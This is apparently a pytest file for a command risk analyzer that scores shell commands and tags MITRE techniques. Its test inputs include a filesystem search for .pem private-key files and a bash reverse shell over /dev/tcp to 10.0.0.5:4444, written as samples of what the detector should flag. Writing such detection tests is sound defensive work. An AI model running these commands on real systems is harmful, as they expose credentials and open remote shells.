from app.risk import RiskAnalyzer


def test_benign_command_is_low_risk():
    result = RiskAnalyzer().analyze("ls -la")
    assert result.severity == "LOW"
    assert result.score == 0


def test_credential_search_is_detected():
    result = RiskAnalyzer().analyze('find / -name "*.pem"')
    assert result.score >= 35
    assert "T1552.001" in result.mitre_techniques


def test_reverse_shell_is_critical():
    result = RiskAnalyzer().analyze("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1")
    assert result.severity == "CRITICAL"
    assert result.score >= 80
